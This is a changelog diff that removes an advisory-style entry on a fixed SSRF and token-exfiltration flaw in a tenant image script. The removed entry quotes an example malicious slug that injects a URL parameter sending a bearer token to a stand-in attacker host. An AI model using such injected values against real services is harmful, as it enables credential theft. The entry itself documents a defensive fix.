@@ -11,11 +11,6 @@ Entries are published daily at 23:50 UTC.
 ## 2026-05-14
 
 ### 🔒 Security
-
-- **OFFSEC-006: tenant slug SSRF + token exfiltration in `promote-tenant-image.sh` fixed**: tenant slugs were interpolated into URL paths (`cp_redeploy_tenant`, `tenant_buildinfo`, `tenant_health`, `resolve_tenant_instance_id`) and ECR identifiers without sanitisation. A malicious slug such as `?url=https://attacker.com&token=$CP_TOKEN` could trigger SSRF or exfiltrate the platform bearer token via URL parameter injection. The fix adds RFC-1123 slug validation (`validate_slug()`) that rejects any slug not matching `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$` before any network call is issued, and uses `set -f` to disable glob expansion of metacharacters (`*`, `?`, `[`) in slug values. (`molecule-core` [#933](https://git.moleculesai.app/molecule-ai/molecule-core/pulls/933))
-
-### 🔧 Fixes
-
 - **Canvas accessibility round 3**: WCAG AA contrast fixes, focus-visible rings, and ARIA attribute corrections applied across `ConversationTraceModal`, `ErrorBoundary`, `ExternalConnectModal`, `MissingKeysModal`, `ProviderModelSelector`, `ConversationTraceModal`, `ActivityTab`, `ScheduleTab`, and `SkillsTab`. (`molecule-core` [#936](https://git.moleculesai.app/molecule-ai/molecule-core/pulls/936), [#949](https://git.moleculesai.app/molecule-ai/molecule-core/pulls/949))
 
 ### 🧹 Internal
